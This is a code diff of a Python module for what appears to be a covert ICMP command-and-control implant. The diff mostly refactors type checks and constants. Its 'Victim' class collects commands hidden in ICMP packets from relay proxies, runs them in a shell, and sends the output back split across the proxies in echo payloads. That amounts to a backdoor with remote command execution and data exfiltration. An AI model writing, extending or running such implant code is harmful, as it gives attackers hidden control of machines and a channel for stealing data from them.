@@ -11,6 +11,7 @@ import select
 import ipaddress 
 
 from mymethods import *
+from custom_enum import * 
 
 #file_path = "./attacksingleton.py"
 #directory = os.path.dirname(file_path)
@@ -18,14 +19,15 @@ from mymethods import *
 #import attacksingleton 
 from attacksingleton import * 
 from attacksingleton import _IPx
+from custom_enum import SENDER_TRUE_SENDER, MSG
 
 #---------------------
 
 def choose_proxy(proxy_list:list[ipaddress.IPv4Address]): 
-    if not istype.list(proxy_list): 
+    if not is_list(proxy_list): 
         raise Exception("choose_proxy: Argomenti non corretti") 
     print(f"I proxy utilzzabili sono: {len(proxy_list)}\n\t{proxy_list}") 
-    if not istype.list(proxy_list) or len(proxy_list)<=0:
+    if not is_list(proxy_list) or len(proxy_list)<=0:
         raise ValueError("choose_proxy: Argomenti non corretti") 
     return random.choice(proxy_list) 
 
@@ -48,7 +50,7 @@ def get_data_from_command(process_shell):
                     stripped_data=output_line.strip()
                     print("stdout:",stripped_data)
                     data.append(stripped_data) 
-                    if END_DATA.strip() in stripped_data:
+                    if MSG.END_DATA.strip() in stripped_data:
                         print(f"No more lines to read")
                         there_is_smth_to_read = False
                         break
@@ -89,9 +91,9 @@ def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Even
         nonlocal comando, connected_proxy, event_pktconn
         print(f"callback wait_for_command received:\n\t{packet.summary()}") 
         if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
-            if ipaddress.ip_address(packet[IP].src) in connected_proxy and CONFIRM_COMMAND.encode() in packet[Raw].load:
-                comando.append(packet[Raw].load.decode().replace(CONFIRM_COMMAND,""))
-                checksum=mycalc.checksum((CONFIRM_COMMAND+comando[0]).encode())
+            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.CONFIRM_COMMAND.encode() in packet[Raw].load:
+                comando.append(packet[Raw].load.decode().replace(MSG.CONFIRM_COMMAND,""))
+                checksum=mycalc.checksum((MSG.CONFIRM_COMMAND+comando[0]).encode())
                 print(f"Payload: {packet[Raw].load} and ICMP ID: {packet[ICMP].id}") 
                 if packet[ICMP].id==checksum: 
                     print(f"Ricevuto il comando {comando}")
@@ -99,9 +101,9 @@ def callback_wait_for_command(connected_proxy:list, event_pktconn:threading.Even
                     return 
             if ipaddress.ip_address(packet[IP].src) not in connected_proxy:
                 print(f"Received packet from not recognized address {packet[IP].src}")
-            if CONFIRM_COMMAND.encode() not in packet[Raw].load:
+            if MSG.CONFIRM_COMMAND.encode() not in packet[Raw].load:
                 print(f"Payload doesn't have CONFIRM_COMMAND: {packet[Raw].load}")
-            if ipaddress.ip_address(packet[IP].src) in connected_proxy and END_COMMUNICATION.encode() in packet[Raw].load:
+            if ipaddress.ip_address(packet[IP].src) in connected_proxy and MSG.END_COMMUNICATION.encode() in packet[Raw].load:
                 print(f"End of communication ")
                 comando.append(packet[Raw].load.decode()) #packet[Raw].load.decode().replace(END_COMMUNICATION,"")
                 threadevent.set(event_pktconn)
@@ -154,7 +156,7 @@ class GET_ARGS:
             #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")    
             try:
                 args,unknown =PARSER.check_arguments(parser) 
-                if not IS_TYPE.namespace(args) or not IS_TYPE.list(unknown) or len(unknown)>0:  
+                if not is_namespace(args) or not is_list(unknown) or len(unknown)>0:  
                     raise ValueError(f"Argomenti sconosciuti: {unknown}") 
                 return args if GET_ARGS.check_value_in_parser(oggetto, args) else None
             except Exception as e: 
@@ -170,14 +172,14 @@ class GET_ARGS:
         if not isinstance(args,argparse.Namespace): 
             print(f"args non vlaido")  
         if isinstance(oggetto,Victim):  
-            if not args.num_proxy or not IS_TYPE.integer(args.num_proxy): 
+            if not args.num_proxy or not is_integer(args.num_proxy): 
                 print(f"--num_proxy non specificato") 
             else: return True  
         return False
 
 WAITING_TIME=20
 DEBUG=False 
-type_sender=SENDER_TYPE.TRUE_SENDER 
+type_sender=SENDER_TRUE_SENDER 
 use_delay=False
 class Victim: 
     ip_host:ipaddress=None 
@@ -191,25 +193,25 @@ class Victim:
         #---------------------
         self.ip_host=ADD_TO_METHODS.get_ip_host()
         args=GET_ARGS.from_parser(self) 
-        if not IS_TYPE.namespace(args): 
+        if not is_namespace(args): 
             exit(0) 
         self.num_proxy=args.num_proxy 
-        if not IS_TYPE.integer(self.num_proxy): 
+        if not is_integer(self.num_proxy): 
             raise TypeError("num_proxy non valido")
         self.connected_proxy=CONNECTED_PROXY() 
     
     def check_variables(self): 
-        if not IS_TYPE.ipaddress(self.ip_host): 
+        if not is_ipaddress(self.ip_host): 
             raise TypeError("ip_host non valido")  
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             raise TypeError("attack_function non AttackType") 
-        if not IS_TYPE.integer(self.num_proxy): 
+        if not is_integer(self.num_proxy): 
             raise TypeError("numero proxy non valido") 
         if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
             raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
-        if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+        if not is_list(self.connected_proxy.proxy_list): 
             raise TypeError("proxy_list non valido") 
-        if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+        if not is_threading_Lock(self.connected_proxy.lock): 
             raise TypeError("lock non valido") 
     
     class WAIT_PROXIES:
@@ -222,23 +224,23 @@ class Victim:
         def __init__(self, vittima, num_proxy):
             if not isinstance(vittima, Victim): 
                 raise TypeError("non oggetto Victim->",type(vittima)) 
-            if not IS_TYPE.integer(num_proxy) or num_proxy<0: 
+            if not is_integer(num_proxy) or num_proxy<0: 
                 raise TypeError("numero non valido->",num_proxy)  
             self.vittima=vittima 
             self.num_proxy=num_proxy
             self.event_enough_proxy=GET.threading_Event() 
-            if not IS_TYPE.threading_Event(self.event_enough_proxy): 
+            if not is_threading_Event(self.event_enough_proxy): 
                 raise TypeError("non threading.Event",type(self.event_enough_proxy))
             self.connected_proxy=CONNECTED_PROXY() 
 
         def num_needed_proxy(connected_proxy, num_proxy)->int:   
             if not isinstance(connected_proxy, CONNECTED_PROXY): 
                 raise TypeError("connected_proxy is not CONNECTED_PROXY",type(connected_proxy))
-            if not IS_TYPE.list(connected_proxy.proxy_list): 
+            if not is_list(connected_proxy.proxy_list): 
                 raise TypeError("proxy_list non valido") 
-            if not IS_TYPE.threading_Lock(connected_proxy.lock): 
+            if not is_threading_Lock(connected_proxy.lock): 
                 raise TypeError("ip_host non valido") 
-            if not IS_TYPE.integer(num_proxy) or num_proxy<0: 
+            if not is_integer(num_proxy) or num_proxy<0: 
                 raise TypeError("numero non valido->",num_proxy)  
             connected_proxy.lock.acquire() 
             #is_enough_proxy=len(connected_proxy.proxy_list) >= num_proxy 
@@ -249,23 +251,23 @@ class Victim:
         def callback_timer(self): 
             if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
                 raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
-            if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+            if not is_list(self.connected_proxy.proxy_list): 
                 raise TypeError("proxy_list non valido") 
-            if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+            if not is_threading_Lock(self.connected_proxy.lock): 
                 raise TypeError("ip_host non valido") 
-            if not IS_TYPE.integer(self.num_proxy) or self.num_proxy<0: 
+            if not is_integer(self.num_proxy) or self.num_proxy<0: 
                 raise TypeError("numero proxy non valido")  
-            if not IS_TYPE.threading_Event(self.event_enough_proxy): 
+            if not is_threading_Event(self.event_enough_proxy): 
                 raise TypeError("non threading.Event->",type(self.event_enough_proxy))
             if self.num_needed_proxy(self.connected_proxy, self.num_proxy)>0: 
                 print("NOT ENOUGH PROXIES") 
                 msg="Continuare ad aspettare ulteriori proxy? (s/n) " 
                 if ask_bool_choice(msg): 
                     print("Continuo ad aspettare...") 
-                    if IS_TYPE.threading_Timer(self.timer): 
+                    if is_threading_Timer(self.timer): 
                         self.timer.cancel()
                     self.timer=GET.timer(WAITING_TIME, self.callback_timer()) 
-                    if not IS_TYPE.threading_Timer(self.timer): 
+                    if not is_threading_Timer(self.timer): 
                         raise TypeError("non è threading.Timer",type(self.timer))
                     self.timer.start() 
                     return
@@ -276,24 +278,24 @@ class Victim:
         
         def get_pkt_callback(self): 
             def check_var(proxy:ipaddress.IPv4Address, connected_proxy:CONNECTED_PROXY=None): 
-                if not IS_TYPE.ipaddress(proxy): 
+                if not is_ipaddress(proxy): 
                     raise TypeError("proxy non ipaddress") 
                 if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
                     raise TypeError("connected_proxy is not CONNECTED_PROXY->",type(self.connected_proxy)) 
-                if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+                if not is_threading_Lock(self.connected_proxy.lock): 
                     raise TypeError("lock non valido->",type(self.connected_proxy.lock)) 
-                if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+                if not is_list(self.connected_proxy.proxy_list): 
                     raise TypeError("proxy_list non valido->",type(self.connected_proxy.proxy_list)) 
-                if not IS_TYPE.dictionary(connected_proxy.type_attack): 
+                if not is_dictionary(connected_proxy.type_attack): 
                     raise TypeError("type_attack non valido->",type(self.connected_proxy.type_attack)) 
             def is_proxy_connected(connected_proxy, ip_src): 
                 if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
                     raise TypeError("connected_proxy is not CONNECTED_PROXY->",type(self.connected_proxy)) 
-                if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+                if not is_threading_Lock(self.connected_proxy.lock): 
                     raise TypeError("lock non valido->",type(self.connected_proxy.lock)) 
-                if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+                if not is_list(self.connected_proxy.proxy_list): 
                     raise TypeError("proxy_list non valido->",type(self.connected_proxy.proxy_list)) 
-                if not IS_TYPE.ipaddress(ip_src): 
+                if not is_ipaddress(ip_src): 
                     raise TypeError("non ipaddress->",type(ip_src))
                 connected_proxy.lock.acquire() 
                 is_already_connected= ip_src in connected_proxy.proxy_list
@@ -303,13 +305,13 @@ class Victim:
             def update_attack_type(str_attacco, connected_proxy, ip_src): 
                 if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
                     raise TypeError("connected_proxy is not CONNECTED_PROXY->",type(self.connected_proxy)) 
-                if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+                if not is_threading_Lock(self.connected_proxy.lock): 
                     raise TypeError("lock non valido->",type(self.connected_proxy.lock)) 
-                if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+                if not is_list(self.connected_proxy.proxy_list): 
                     raise TypeError("proxy_list non valido->",type(self.connected_proxy.proxy_list)) 
-                if not IS_TYPE.ipaddress(ip_src): 
+                if not is_ipaddress(ip_src): 
                     raise TypeError("non ipaddress->",type(ip_src))
-                if not IS_TYPE.string(str_attacco): 
+                if not is_string(str_attacco): 
                     raise TypeError("non stringa->",type(str_attacco))
                 attack_function=AttackType.get_attack_method(str_attacco) 
                 connected_proxy.lock.acquire() 
@@ -319,24 +321,24 @@ class Victim:
                 print("Tipologia di attacco ricevuto:",connected_proxy.type_attack[ip_src.compressed]) 
                 print("Tipologia di attacco ricevuto:",self.attack_function) 
             def invia_conferma(msg_conferma, ip_src): 
-                if not IS_TYPE.string(msg_conferma): 
+                if not is_string(msg_conferma): 
                     raise TypeError("non stringa->",type(msg_conferma)) 
-                if not IS_TYPE.ipaddress(ip_src): 
+                if not is_ipaddress(ip_src): 
                     raise TypeError("non ipaddress->",type(ip_src)) 
                 SendSingleton(
                     AttackType.ipv4_echo_payload, 
-                    SENDER_TYPE.TRUE_SENDER, 
+                    SENDER_TRUE_SENDER, 
                     use_delay=False
                 ).send_data(msg_conferma.encode(), ip_src) 
                 print("Conferma inviata a:",ip_src)  
             def update_connected_proxies(connected_proxy, ip_src): 
                 if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
                     raise TypeError("connected_proxy is not CONNECTED_PROXY->",type(self.connected_proxy)) 
-                if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+                if not is_threading_Lock(self.connected_proxy.lock): 
                     raise TypeError("lock non valido->",type(self.connected_proxy.lock)) 
-                if not IS_TYPE.list(self.connected_proxy.proxy_list): 
+                if not is_list(self.connected_proxy.proxy_list): 
                     raise TypeError("proxy_list non valido->",type(self.connected_proxy.proxy_list)) 
-                if not IS_TYPE.ipaddress(ip_src): 
+                if not is_ipaddress(ip_src): 
                     raise TypeError("non ipaddress->",type(ip_src))
                 connected_proxy.lock.acquire() 
                 if ip_src not in connected_proxy.proxy_list:
@@ -389,10 +391,10 @@ class Victim:
         
         def wait(self,ip_host): 
             def get_filter(): 
-                if not IS_TYPE.ipaddress(ip_host): 
+                if not is_ipaddress(ip_host): 
                     raise TypeError("ip_host non valido")  
-                IPv4_ECHO_REQUEST= ICMP_TYPE.v4_Echo_Request if ip_host.version==4 else ICMP_TYPE.v4_Echo_Request
-                IPv4_ECHO_REPLY= ICMP_TYPE.v4_Echo_Reply if ip_host.version==4 else ICMP_TYPE.v4_Echo_Reply
+                IPv4_ECHO_REQUEST= ICMP_v4_Echo_Request if ip_host.version==4 else ICMP_v4_Echo_Request
+                IPv4_ECHO_REPLY= ICMP_v4_Echo_Reply if ip_host.version==4 else ICMP_v4_Echo_Reply
                 if ip_host.version==4: 
                     icmp="icmp " 
                 elif ip_host.version==6: 
@@ -409,16 +411,16 @@ class Victim:
                     ,"iface":interface
                 } 
                 return GET.AsyncSniffer(sniff_args) 
-            if not IS_TYPE.ipaddress(ip_host): 
+            if not is_ipaddress(ip_host): 
                 raise TypeError("ip_host non valido") 
-            if not IS_TYPE.threading_Timer(timer): 
+            if not is_threading_Timer(timer): 
                 raise TypeError("non è threading.Timer",type(timer))
             interface=NETWORK.DEFAULT_INTERFACE().default_iface 
             if interface is None: 
                 raise ValueError("interface is None",interface) 
             print("Monitoring interface->",interface) 
             sniffer:AsyncSniffer=get_sniffer()
-            if not IS_TYPE.AsyncSniffer(sniffer): 
+            if not is_AsyncSniffer(sniffer): 
                 raise TypeError("non AsyncSniffer",type(sniffer)) 
             self.timer.start() 
             if self.timer.is_alive():
@@ -447,13 +449,13 @@ class Victim:
             WAITING_TIME, 
             lambda:object_wait_proxy.callback_timer()
         ) 
-        if not IS_TYPE.threading_Timer(object_wait_proxy.timer): 
+        if not is_threading_Timer(object_wait_proxy.timer): 
             raise TypeError("non è threading.Timer",type(object_wait_proxy.timer))
         object_wait_proxy.wait(self.ip_host)  
         if DEBUG: 
             print("DEBUG -> wait-connections")
             return
-        if not IS_TYPE.enum(self.attack_function, AttackType): 
+        if not is_enum_member(self.attack_function, AttackType): 
             raise TypeError("attack_function non valida")  
 
     def start(self):  
@@ -470,7 +472,7 @@ class Victim:
                 comando=input(msg) 
             else: comando=self.wait_command() 
         #--------------------------- 
-        if not IS_TYPE.integer(self.num_proxy) or self.num_proxy<=0: 
+        if not is_integer(self.num_proxy) or self.num_proxy<=0: 
             print("Numero proxy non valido:",self.num_proxy) 
             exit(0) 
         print("IP della macchina:", self.ip_host) 
@@ -522,9 +524,9 @@ class Victim:
     
     def wait_command(self)->str: 
         #start wait_attacker_command
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             raise TypeError("attack_function non AttackType") 
-        if not IS_TYPE.ipaddress(self.ip_host): 
+        if not is_ipaddress(self.ip_host): 
             raise TypeError("ip_host non valido") 
         
         print("Waiting command tramite:",self.attack_function) 
@@ -534,18 +536,18 @@ class Victim:
         print("Waiting data")
         wait_class.wait()  
         command=wait_class.data 
-        if not IS_TYPE.string(command): 
+        if not is_string(command): 
             raise TypeError("non stringa",type(command)) 
         print("Received command...")
         print("The command is:",type(command),command) 
-        if not IS_TYPE.string(command): 
+        if not is_string(command): 
             raise TypeError("comando non stringa",type(command))
         print("END wait_command ")
         return command
     
     def exec_command(self, comando:str=None): 
         def append_END_DATA(command:str=None):
-            if not IS_TYPE.string(command):
+            if not is_string(command):
                 raise ValueError("comando non stringa",comando)
             if sys.platform=="win32":
                 command+=f" && echo '{MSG.END_DATA.value}'"
@@ -555,7 +557,7 @@ class Victim:
             print("END append_END_DATA->",command) 
             return command
         def read_stream(stream, data_list:list=None):  
-            if not IS_TYPE.list(data_list): 
+            if not is_list(data_list): 
                 raise TypeError("data_list non valida")
             for line in iter(stream.readline, ''):
                 if line:
@@ -564,12 +566,12 @@ class Victim:
                     data_list.append(decoded)
             stream.close() 
         #---------------------
-        if not IS_TYPE.string(comando): 
+        if not is_string(comando): 
             raise ValueError("comando non stringa",comando) 
         #comando=append_END_DATA(comando) 
         print("COMANDO",comando)
         process_shell=GET.shellProcess_command(comando)  
-        if not IS_TYPE.subprocess_Popen(process_shell): 
+        if not is_subprocess_Popen(process_shell): 
             raise Exception("shell non valida:",type(process_shell)) 
         if not process_shell.stdout: 
             raise Exception("stdout non valido") 
@@ -599,31 +601,31 @@ class Victim:
         print("Comando eseguito") 
         #print("STDOUT",data_stdout) 
         data:str=""
-        if IS_TYPE.list(data_stdout) and len(data_stdout)>0: 
+        if is_list(data_stdout) and len(data_stdout)>0: 
             data+="".join(text for text in data_stdout) 
         #print("STDEERR",data_stderr) 
-        if IS_TYPE.list(data_stderr) and len(data_stderr)>0: 
+        if is_list(data_stderr) and len(data_stderr)>0: 
             data+="".join(text for text in data_stderr) 
         print("DATI ESECUZIONE",data) 
         return None if data.strip()=="" else data  
 
     def get_proxy_data(self, data:str=None): 
     #def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4Address], attack_function:dict): 
-        if not IS_TYPE.string(data) or data.strip()=="": 
+        if not is_string(data) or data.strip()=="": 
             raise TypeError("data non valido") 
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             if DEBUG: 
                 print("DEBUG: send_data -> attack_function")
             else: raise TypeError("attack_function non AttackType") 
         if not isinstance(self.connected_proxy, CONNECTED_PROXY): 
             raise TypeError("connected_proxy is not CONNECTED_PROXY",type(self.connected_proxy))
-        if not IS_TYPE.list(self.connected_proxy.proxy_list) or len(self.connected_proxy.proxy_list)<=0: 
+        if not is_list(self.connected_proxy.proxy_list) or len(self.connected_proxy.proxy_list)<=0: 
             if DEBUG: 
                 print("DEBUG: get_proxy_data -> proxy_list")
             else: raise TypeError("proxy_list non valido") 
-        if not IS_TYPE.threading_Lock(self.connected_proxy.lock): 
+        if not is_threading_Lock(self.connected_proxy.lock): 
             raise TypeError("lock non valido") 
-        if not IS_TYPE.ipaddress(self.ip_host): 
+        if not is_ipaddress(self.ip_host): 
             raise TypeError("ip_host non valido")   
         #print("DATA:",data) 
         if DEBUG: 
@@ -667,9 +669,9 @@ class Victim:
 
     def send_data(self, proxy_data:list[str]=None): 
         def send_last_packet(proxy): 
-            if not IS_TYPE.ipaddress(proxy): 
+            if not is_ipaddress(proxy): 
                 raise TypeError("proxy non valido")   
-            if not IS_TYPE.enum(self.attack_function,AttackType): 
+            if not is_enum_member(self.attack_function,AttackType): 
                 raise TypeError("attack_function non AttackType") 
             print("SEND LAST PACKET:",proxy) 
             data=MSG.LAST_PACKET.value  
@@ -684,11 +686,11 @@ class Victim:
             except Exception as e: 
                 print(e)
         #--------------------
-        if not IS_TYPE.list(proxy_data): 
+        if not is_list(proxy_data): 
             raise TypeError("proxy_data non lista") 
-        if all(not IS_TYPE.string(stringa) for stringa in proxy_data): 
+        if all(not is_string(stringa) for stringa in proxy_data): 
             raise TypeError("data non string",type(proxy_data)) 
-        if not IS_TYPE.enum(self.attack_function,AttackType): 
+        if not is_enum_member(self.attack_function,AttackType): 
             if DEBUG: 
                 print("DEBUG: send_data -> attack_function")
             else: raise TypeError("attack_function non AttackType")  
@@ -699,10 +701,10 @@ class Victim:
             if DEBUG: 
                 proxy=self.ip_host
             else: proxy=self.connected_proxy.proxy_list[index] 
-            if not IS_TYPE.ipaddress(proxy): 
+            if not is_ipaddress(proxy): 
                 print("ADDRESS NON VALIDO",proxy) 
                 continue 
-            if not IS_TYPE.string(data) or data.strip()=="": 
+            if not is_string(data) or data.strip()=="": 
                 print("DATA NON VALIDO",data) 
                 send_last_packet(proxy) 
                 continue 
